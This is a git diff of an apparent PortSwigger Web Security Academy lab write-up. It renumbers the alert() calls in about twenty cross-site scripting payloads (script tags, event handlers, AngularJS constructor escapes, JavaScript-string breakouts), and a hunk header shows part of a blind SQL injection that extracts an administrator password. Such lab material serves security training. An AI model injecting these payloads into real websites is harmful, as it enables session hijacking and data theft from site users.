@@ -195,7 +195,7 @@ SELECT CASE WHEN (substring((SELECT password FROM users where username = 'admini
 In "Comment" field:
 
 ```
-<script>alert(1)</script>
+<script>alert(2)</script>
 ```
 
 
@@ -204,7 +204,7 @@ In "Comment" field:
 Search:
 
 ```
-"><script>alert(1)</script>
+"><script>alert(3)</script>
 ```
 
 
@@ -213,7 +213,7 @@ Search:
 Search:
 
 ```
-<img src=x onerror=alert(1) />
+<img src=x onerror=alert(4) />
 ```
 
 
@@ -227,7 +227,7 @@ Search:
 #### XSS.06 - DOM XSS in jQuery selector sink using a hashchange event
 
 ```
-<iframe style="width:100%;height:100%" src="https://0ae000fe04dcc1068048c1f000ed005b.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(1)>'">
+<iframe style="width:100%;height:100%" src="https://0ae000fe04dcc1068048c1f000ed005b.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(6)>'">
 ```
 
 
@@ -236,7 +236,7 @@ Search:
 Search:
 
 ```
-" autofocus onfocus=alert(1) x="
+" autofocus onfocus=alert(7) x="
 ```
 
 
@@ -245,7 +245,7 @@ Search:
 "Website" field:
 
 ```
-javascript:alert(1)
+javascript:alert(8)
 ```
 
 
@@ -254,30 +254,30 @@ javascript:alert(1)
 Search:
 
 ```
-';alert(1)//
+';alert(9)//
 ```
 
 
 #### XSS.10 - DOM XSS in document.write sink using source location.search inside a select element
 
 ```
-/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>
+/product?productId=4&storeId=</option><script>alert(10)</script><option%20selected>
 ```
 
 
 #### XSS.11 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 
 ```
-{{constructor.constructor('alert(1)')()}}
+{{constructor.constructor('alert(11)')()}}
 
-{{$on.constructor('alert(1)')()}}
+{{$on.constructor('alert(11)')()}}
 ```
 
 
 #### XSS.12 - Reflected DOM XSS
 
 ```
-\"-alert(1)}//
+\"-alert(12)}//
 ```
 
 
@@ -286,7 +286,7 @@ Search:
 "Comment" field:
 
 ```
-</p><img src=x onerror=alert(1) /><p>
+</p><img src=x onerror=alert(13) /><p>
 ```
 
 
@@ -354,28 +354,28 @@ function handleResponse() {
 #### XSS.19 - Reflected XSS with some SVG markup allowed
 
 ```
-<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<svg><animatetransform onbegin=alert(19) attributeName=transform>
 ```
 
 
 #### XSS.20 - Reflected XSS in canonical link tag
 
 ```
-/post?postId=1&a=b'accesskey='X'onclick='alert(1)
+/post?postId=1&a=b'accesskey='X'onclick='alert(20)
 ```
 
 
 #### XSS.21 - Reflected XSS into a JavaScript string with single quote
 
 ```
-';</script><img src=x onerror=alert(1)><script>var a='a
+';</script><img src=x onerror=alert(21)><script>var a='a
 ```
 
 
 #### XSS.22 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 
 ```
-\';alert(1);//
+\';alert(22);//
 ```
 
 
@@ -385,14 +385,14 @@ function handleResponse() {
 POST /post/comment HTTP/2
 ...
 
-csrf=e8yz3UQ62qX7CBfs9PFEanjwdYjzbaMz&postId=1&comment=test1&name=test2&email=test3%40test.com&website=http%3A%2F%2Ftest4.com%26apos;);alert(1)%3b//
+csrf=e8yz3UQ62qX7CBfs9PFEanjwdYjzbaMz&postId=1&comment=test1&name=test2&email=test3%40test.com&website=http%3A%2F%2Ftest4.com%26apos;);alert(23)%3b//
 ```
 
 
 #### XSS.24 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks
 
 ```
-${alert(1)}
+${alert(24)}
 ```
 
 
